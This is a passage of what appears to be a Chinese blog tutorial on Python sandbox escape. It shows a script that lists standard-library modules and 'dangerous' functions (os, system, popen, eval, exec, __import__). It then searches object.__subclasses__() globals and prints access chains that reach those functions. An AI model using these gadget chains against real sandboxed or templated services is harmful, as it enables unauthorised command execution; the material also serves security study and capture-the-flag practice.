class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># https://github.com/python/cpython/tree/2.7/Lib</span></span><br><span class="line"><span class="comment"># ls -l /usr/lib/python2.7 | awk &#x27;&#123;print$9&#125;&#x27; | grep -v &#x27;.pyc\|this\|antigravity&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Python2标准库模块</span></span><br><span class="line">modules2 = [<span class="string">&#x27;_abcoll&#x27;</span>, <span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;aifc&#x27;</span>, <span class="string">&#x27;anydbm&#x27;</span>, <span class="string">&#x27;argparse.egg-info&#x27;</span>, <span class="string">&#x27;argparse&#x27;</span>, <span class="string">&#x27;ast&#x27;</span>, <span class="string">&#x27;asynchat&#x27;</span>, <span class="string">&#x27;asyncore&#x27;</span>, <span class="string">&#x27;atexit&#x27;</span>, <span class="string">&#x27;audiodev&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;BaseHTTPServer&#x27;</span>, <span class="string">&#x27;Bastion&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;binhex&#x27;</span>, <span class="string">&#x27;bisect&#x27;</span>, <span class="string">&#x27;bsddb&#x27;</span>, <span class="string">&#x27;calendar&#x27;</span>, <span class="string">&#x27;CGIHTTPServer&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;chunk&#x27;</span>, <span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;codeop&#x27;</span>, <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;collections&#x27;</span>, <span class="string">&#x27;colorsys&#x27;</span>, <span class="string">&#x27;commands&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;compiler&#x27;</span>, <span class="string">&#x27;ConfigParser&#x27;</span>, <span class="string">&#x27;config-x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;contextlib&#x27;</span>, <span class="string">&#x27;cookielib&#x27;</span>, <span class="string">&#x27;Cookie&#x27;</span>, <span class="string">&#x27;copy&#x27;</span>, <span class="string">&#x27;copy_reg&#x27;</span>, <span class="string">&#x27;cProfile&#x27;</span>, <span class="string">&#x27;csv&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;curses&#x27;</span>, <span class="string">&#x27;dbhash&#x27;</span>, <span class="string">&#x27;decimal&#x27;</span>, <span class="string">&#x27;difflib&#x27;</span>, <span class="string">&#x27;dircache&#x27;</span>, <span class="string">&#x27;dis&#x27;</span>, <span class="string">&#x27;dist-packages&#x27;</span>, <span class="string">&#x27;distutils&#x27;</span>, <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;DocXMLRPCServer&#x27;</span>, <span class="string">&#x27;dumbdbm&#x27;</span>, <span class="string">&#x27;dummy_threading&#x27;</span>, <span class="string">&#x27;dummy_thread&#x27;</span>, <span class="string">&#x27;email&#x27;</span>, <span class="string">&#x27;encodings&#x27;</span>, <span class="string">&#x27;ensurepip&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;fnmatch&#x27;</span>, <span class="string">&#x27;formatter&#x27;</span>, <span class="string">&#x27;fpformat&#x27;</span>, <span class="string">&#x27;fractions&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;functools&#x27;</span>, <span class="string">&#x27;__future__&#x27;</span>, <span class="string">&#x27;genericpath&#x27;</span>, <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;glob&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>, <span class="string">&#x27;hashlib&#x27;</span>, <span class="string">&#x27;heapq&#x27;</span>, <span class="string">&#x27;hmac&#x27;</span>, <span class="string">&#x27;hotshot&#x27;</span>, <span class="string">&#x27;htmlentitydefs&#x27;</span>, <span class="string">&#x27;htmllib&#x27;</span>, <span class="string">&#x27;HTMLParser&#x27;</span>, <span class="string">&#x27;httplib&#x27;</span>, <span class="string">&#x27;ihooks&#x27;</span>, <span class="string">&#x27;imaplib&#x27;</span>, <span class="string">&#x27;imghdr&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;imputil&#x27;</span>, <span class="string">&#x27;inspect&#x27;</span>, <span class="string">&#x27;io&#x27;</span>, <span class="string">&#x27;json&#x27;</span>, <span class="string">&#x27;keyword&#x27;</span>, <span class="string">&#x27;lib2to3&#x27;</span>, <span class="string">&#x27;lib-dynload&#x27;</span>, <span class="string">&#x27;lib-tk&#x27;</span>, <span class="string">&#x27;LICENSE.txt&#x27;</span>, <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;locale&#x27;</span>, <span class="string">&#x27;logging&#x27;</span>, <span class="string">&#x27;_LWPCookieJar&#x27;</span>, <span class="string">&#x27;macpath&#x27;</span>, <span class="string">&#x27;macurl2path&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;markupbase&#x27;</span>, <span class="string">&#x27;md5&#x27;</span>, <span class="string">&#x27;mhlib&#x27;</span>, <span class="string">&#x27;mimetools&#x27;</span>, <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;MimeWriter&#x27;</span>, <span class="string">&#x27;mimify&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span class="string">&#x27;_MozillaCookieJar&#x27;</span>, <span class="string">&#x27;multifile&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;mutex&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;new&#x27;</span>, <span class="string">&#x27;nntplib&#x27;</span>, <span class="string">&#x27;ntpath&#x27;</span>, <span class="string">&#x27;nturl2path&#x27;</span>, <span class="string">&#x27;numbers&#x27;</span>, <span class="string">&#x27;opcode&#x27;</span>, <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;os2emxpath&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;_osx_support&#x27;</span>, <span class="string">&#x27;pdb.doc&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;__phello__.foo&#x27;</span>, <span class="string">&#x27;pickle&#x27;</span>, <span class="string">&#x27;pickletools&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;plat-x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;plistlib&#x27;</span>, <span class="string">&#x27;popen2&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>, <span class="string">&#x27;posixfile&#x27;</span>, <span class="string">&#x27;posixpath&#x27;</span>, <span class="string">&#x27;pprint&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>, <span class="string">&#x27;pydoc_data&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;_pyio&#x27;</span>, <span class="string">&#x27;Queue&#x27;</span>, <span class="string">&#x27;quopri&#x27;</span>, <span class="string">&#x27;random&#x27;</span>, <span class="string">&#x27;repr&#x27;</span>, <span class="string">&#x27;re&#x27;</span>, <span class="string">&#x27;rexec&#x27;</span>, <span class="string">&#x27;rfc822&#x27;</span>, <span class="string">&#x27;rlcompleter&#x27;</span>, <span class="string">&#x27;robotparser&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;sched&#x27;</span>, <span class="string">&#x27;sets&#x27;</span>, <span class="string">&#x27;sgmllib&#x27;</span>, <span class="string">&#x27;sha&#x27;</span>, <span class="string">&#x27;shelve&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;SimpleHTTPServer&#x27;</span>, <span class="string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="string">&#x27;sitecustomize&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;smtplib&#x27;</span>, <span class="string">&#x27;sndhdr&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;SocketServer&#x27;</span>, <span class="string">&#x27;sqlite3&#x27;</span>, <span class="string">&#x27;sre_compile&#x27;</span>, <span class="string">&#x27;sre_constants&#x27;</span>, <span class="string">&#x27;sre_parse&#x27;</span>, <span class="string">&#x27;sre&#x27;</span>, <span class="string">&#x27;ssl&#x27;</span>, <span class="string">&#x27;stat&#x27;</span>, <span class="string">&#x27;statvfs&#x27;</span>, <span class="string">&#x27;StringIO&#x27;</span>, <span class="string">&#x27;stringold&#x27;</span>, <span class="string">&#x27;stringprep&#x27;</span>, <span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;_strptime&#x27;</span>, <span class="string">&#x27;struct&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sunaudio&#x27;</span>, <span class="string">&#x27;sunau&#x27;</span>, <span class="string">&#x27;symbol&#x27;</span>, <span class="string">&#x27;symtable&#x27;</span>, <span class="string">&#x27;_sysconfigdata&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>, <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;textwrap&#x27;</span>, <span class="string">&#x27;_threading_local&#x27;</span>, <span class="string">&#x27;threading&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;toaiff&#x27;</span>, <span class="string">&#x27;tokenize&#x27;</span>, <span class="string">&#x27;token&#x27;</span>, <span class="string">&#x27;traceback&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;tty&#x27;</span>, <span class="string">&#x27;types&#x27;</span>, <span class="string">&#x27;unittest&#x27;</span>, <span class="string">&#x27;urllib2&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;urlparse&#x27;</span>, <span class="string">&#x27;UserDict&#x27;</span>, <span class="string">&#x27;UserList&#x27;</span>, <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;UserString&#x27;</span>, <span class="string">&#x27;uuid&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;warnings&#x27;</span>, <span class="string">&#x27;wave&#x27;</span>, <span class="string">&#x27;weakref&#x27;</span>, <span class="string">&#x27;_weakrefset&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;whichdb&#x27;</span>, <span class="string">&#x27;wsgiref&#x27;</span>, <span class="string">&#x27;wsgiref.egg-info&#x27;</span>, <span class="string">&#x27;xdrlib&#x27;</span>, <span class="string">&#x27;xml&#x27;</span>, <span class="string">&#x27;xmllib&#x27;</span>, <span class="string">&#x27;xmlrpclib&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python3标准库模块</span></span><br><span class="line">modules3 = [<span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;aifc&#x27;</span>, <span class="string">&#x27;argparse&#x27;</span>, <span class="string">&#x27;ast&#x27;</span>, <span class="string">&#x27;asynchat&#x27;</span>, <span class="string">&#x27;asyncio&#x27;</span>, <span class="string">&#x27;asyncore&#x27;</span>, <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;binhex&#x27;</span>, <span class="string">&#x27;bisect&#x27;</span>, <span class="string">&#x27;_bootlocale&#x27;</span>, <span class="string">&#x27;bz2&#x27;</span>, <span class="string">&#x27;calendar&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;chunk&#x27;</span>, <span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;codecs&#x27;</span>, <span class="string">&#x27;codeop&#x27;</span>, <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;collections&#x27;</span>, <span class="string">&#x27;_collections_abc&#x27;</span>, <span class="string">&#x27;colorsys&#x27;</span>, <span class="string">&#x27;_compat_pickle&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;_compression&#x27;</span>, <span class="string">&#x27;concurrent&#x27;</span>, <span class="string">&#x27;config-3.8-x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;configparser&#x27;</span>, <span class="string">&#x27;contextlib&#x27;</span>, <span class="string">&#x27;contextvars&#x27;</span>, <span class="string">&#x27;copy&#x27;</span>, <span class="string">&#x27;copyreg&#x27;</span>, <span class="string">&#x27;cProfile&#x27;</span>, <span class="string">&#x27;crypt&#x27;</span>, <span class="string">&#x27;csv&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;curses&#x27;</span>, <span class="string">&#x27;dataclasses&#x27;</span>, <span class="string">&#x27;datetime&#x27;</span>, <span class="string">&#x27;dbm&#x27;</span>, <span class="string">&#x27;decimal&#x27;</span>, <span class="string">&#x27;difflib&#x27;</span>, <span class="string">&#x27;dis&#x27;</span>, <span class="string">&#x27;dist-packages&#x27;</span>, <span class="string">&#x27;distutils&#x27;</span>, <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;dummy_threading&#x27;</span>, <span class="string">&#x27;_dummy_thread&#x27;</span>, <span class="string">&#x27;email&#x27;</span>, <span class="string">&#x27;encodings&#x27;</span>, <span class="string">&#x27;ensurepip&#x27;</span>, <span class="string">&#x27;enum&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;fnmatch&#x27;</span>, <span class="string">&#x27;formatter&#x27;</span>, <span class="string">&#x27;fractions&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;functools&#x27;</span>, <span class="string">&#x27;__future__&#x27;</span>, <span class="string">&#x27;genericpath&#x27;</span>, <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;glob&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>, <span class="string">&#x27;hashlib&#x27;</span>, <span class="string">&#x27;heapq&#x27;</span>, <span class="string">&#x27;hmac&#x27;</span>, <span class="string">&#x27;html&#x27;</span>, <span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;imaplib&#x27;</span>, <span class="string">&#x27;imghdr&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;imp&#x27;</span>, <span class="string">&#x27;inspect&#x27;</span>, <span class="string">&#x27;io&#x27;</span>, <span class="string">&#x27;ipaddress&#x27;</span>, <span class="string">&#x27;json&#x27;</span>, <span class="string">&#x27;keyword&#x27;</span>, <span class="string">&#x27;lib2to3&#x27;</span>, <span class="string">&#x27;lib-dynload&#x27;</span>, <span class="string">&#x27;LICENSE.txt&#x27;</span>, <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;locale&#x27;</span>, <span class="string">&#x27;logging&#x27;</span>, <span class="string">&#x27;lzma&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;_markupbase&#x27;</span>, <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;nntplib&#x27;</span>, <span class="string">&#x27;ntpath&#x27;</span>, <span class="string">&#x27;nturl2path&#x27;</span>, <span class="string">&#x27;numbers&#x27;</span>, <span class="string">&#x27;opcode&#x27;</span>, <span class="string">&#x27;operator&#x27;</span>, <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;_osx_support&#x27;</span>, <span class="string">&#x27;pathlib&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;__phello__.foo&#x27;</span>, <span class="string">&#x27;pickle&#x27;</span>, <span class="string">&#x27;pickletools&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;plistlib&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>, <span class="string">&#x27;posixpath&#x27;</span>, <span class="string">&#x27;pprint&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;_py_abc&#x27;</span>, <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>, <span class="string">&#x27;_pydecimal&#x27;</span>, <span class="string">&#x27;pydoc_data&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;_pyio&#x27;</span>, <span class="string">&#x27;queue&#x27;</span>, <span class="string">&#x27;quopri&#x27;</span>, <span class="string">&#x27;random&#x27;</span>, <span class="string">&#x27;reprlib&#x27;</span>, <span class="string">&#x27;re&#x27;</span>, <span class="string">&#x27;rlcompleter&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;sched&#x27;</span>, <span class="string">&#x27;secrets&#x27;</span>, <span class="string">&#x27;selectors&#x27;</span>, <span class="string">&#x27;shelve&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;signal&#x27;</span>, <span class="string">&#x27;_sitebuiltins&#x27;</span>, <span class="string">&#x27;sitecustomize&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;smtplib&#x27;</span>, <span class="string">&#x27;sndhdr&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;socketserver&#x27;</span>, <span class="string">&#x27;sqlite3&#x27;</span>, <span class="string">&#x27;sre_compile&#x27;</span>, <span class="string">&#x27;sre_constants&#x27;</span>, <span class="string">&#x27;sre_parse&#x27;</span>, <span class="string">&#x27;ssl&#x27;</span>, <span class="string">&#x27;statistics&#x27;</span>, <span class="string">&#x27;stat&#x27;</span>, <span class="string">&#x27;stringprep&#x27;</span>, <span class="string">&#x27;string&#x27;</span>, <span class="string">&#x27;_strptime&#x27;</span>, <span class="string">&#x27;struct&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sunau&#x27;</span>, <span class="string">&#x27;symbol&#x27;</span>, <span class="string">&#x27;symtable&#x27;</span>, <span class="string">&#x27;_sysconfigdata__linux_x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;_sysconfigdata__x86_64-linux-gnu&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>, <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;textwrap&#x27;</span>, <span class="string">&#x27;_threading_local&#x27;</span>, <span class="string">&#x27;threading&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;tkinter&#x27;</span>, <span class="string">&#x27;tokenize&#x27;</span>, <span class="string">&#x27;token&#x27;</span>, <span class="string">&#x27;traceback&#x27;</span>, <span class="string">&#x27;tracemalloc&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;tty&#x27;</span>, <span class="string">&#x27;turtle&#x27;</span>, <span class="string">&#x27;types&#x27;</span>, <span class="string">&#x27;typing&#x27;</span>, <span class="string">&#x27;unittest&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;uuid&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;venv&#x27;</span>, <span class="string">&#x27;warnings&#x27;</span>, <span class="string">&#x27;wave&#x27;</span>, <span class="string">&#x27;weakref&#x27;</span>, <span class="string">&#x27;_weakrefset&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;wsgiref&#x27;</span>, <span class="string">&#x27;xdrlib&#x27;</span>, <span class="string">&#x27;xml&#x27;</span>, <span class="string">&#x27;xmlrpc&#x27;</span>, <span class="string">&#x27;zipapp&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>, <span class="string">&#x27;zipimport&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 危险模块</span></span><br><span class="line">methods = [<span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;commands&#x27;</span>, <span class="string">&#x27;timeit&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;pickle&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;import_module&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;spawn&#x27;</span>, <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;types&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基本类型</span></span><br><span class="line">types = [<span class="string">&#x27;&#x27;</span>, [], (), &#123;&#125;]</span><br><span class="line"></span><br><span class="line"><span class="comment"># object的派生类</span></span><br><span class="line">subclasses = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 危险标准库模块</span></span><br><span class="line">risk_modules = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历派生类并获取模块</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(object.__subclasses__())):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        subclasses[i] = object.__subclasses__()[i].__init__.__globals__.keys()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print(e)</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;------------------------------ 思路二 ------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入了危险模块的派生类</span></span><br><span class="line"><span class="keyword">for</span> i, submodules <span class="keyword">in</span> subclasses.items():</span><br><span class="line">    <span class="keyword">for</span> submodule <span class="keyword">in</span> submodules:</span><br><span class="line">        <span class="keyword">for</span> method <span class="keyword">in</span> methods:</span><br><span class="line">            <span class="keyword">if</span> method == submodule:</span><br><span class="line">                <span class="comment"># print(f&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;method&#125;&#x27;]&quot;)</span></span><br><span class="line">                print(<span class="string">&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;method&#125;&#x27;]&quot;</span>.format(i=i, method=method))</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;------------------------------ 缓冲区 ------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断Python版本</span></span><br><span class="line"><span class="keyword">if</span> (sys.version_info[<span class="number">0</span>]) == <span class="number">3</span>:</span><br><span class="line">    modules = modules3</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    modules = modules2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入了危险模块的标准库</span></span><br><span class="line"><span class="keyword">for</span> module <span class="keyword">in</span> modules:</span><br><span class="line">    risk_modules[module] = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        m = __import__(module)  <span class="comment"># 导入模块</span></span><br><span class="line">        attrs = dir(m)          <span class="comment"># 获取属性与方法</span></span><br><span class="line">        <span class="keyword">for</span> method <span class="keyword">in</span> methods:</span><br><span class="line">            <span class="keyword">if</span> method <span class="keyword">in</span> attrs: <span class="comment"># 若存在危险模块</span></span><br><span class="line">                risk_modules[module].append(method)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print(e)</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;------------------------------ 思路三 ------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入了危险标准库的派生类</span></span><br><span class="line"><span class="keyword">for</span> i, submodules <span class="keyword">in</span> subclasses.items():</span><br><span class="line">    <span class="keyword">for</span> submodule <span class="keyword">in</span> submodules:</span><br><span class="line">        <span class="keyword">for</span> risk_module <span class="keyword">in</span> risk_modules.keys():</span><br><span class="line">            <span class="keyword">if</span> risk_module == submodule:</span><br><span class="line">                <span class="keyword">for</span> method <span class="keyword">in</span> risk_modules[risk_module]:</span><br><span class="line">                    <span class="comment"># print(f&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;risk_module&#125;&#x27;].__dict__[&#x27;&#123;method&#125;&#x27;]&quot;)</span></span><br><span class="line">                    print(<span class="string">&quot;object.__subclasses__()[&#123;i&#125;].__init__.__globals__[&#x27;&#123;risk_module&#125;&#x27;].__dict__[&#x27;&#123;method&#125;&#x27;]&quot;</span>.format(i=i, risk_module=risk_module, method=method))</span><br><span class="line"></span><br><span class="line">print(<span class="string">&#x27;------------------------------ 思路四 ------------------------------&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基本类型的特殊方法</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> types:</span><br><span class="line">    <span class="keyword">for</span> method <span class="keyword">in</span> dir(t):</span><br><span class="line">        <span class="comment"># 待比较类型</span></span><br><span class="line">        c = str(t.__getattribute__(method).__class__)</span><br><span class="line">        <span class="comment"># Python2特殊类型</span></span><br><span class="line">        c2 = <span class="string">&quot;&lt;type &#x27;builtin_function_or_method&#x27;&gt;&quot;</span></span><br><span class="line">        <span class="comment"># Python3特殊类型</span></span><br><span class="line">        c3 = <span class="string">&quot;&lt;class &#x27;builtin_function_or_method&#x27;&gt;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> c == c2 <span class="keyword">or</span> c == c3:</span><br><span class="line">            <span class="comment"># 转义双引号</span></span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                t = <span class="string">&quot;&#x27;&#x27;&quot;</span></span><br><span class="line">            print(<span class="string">&quot;&#123;t&#125;.&#123;method&#125;.__class__.__call__&quot;</span>.format(t=t, method=method))</span><br></pre></td></tr></table></figure><h4 id="思路一实例"><a href="#思路一实例" class="headerlink" title="思路一实例"></a>思路一实例</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 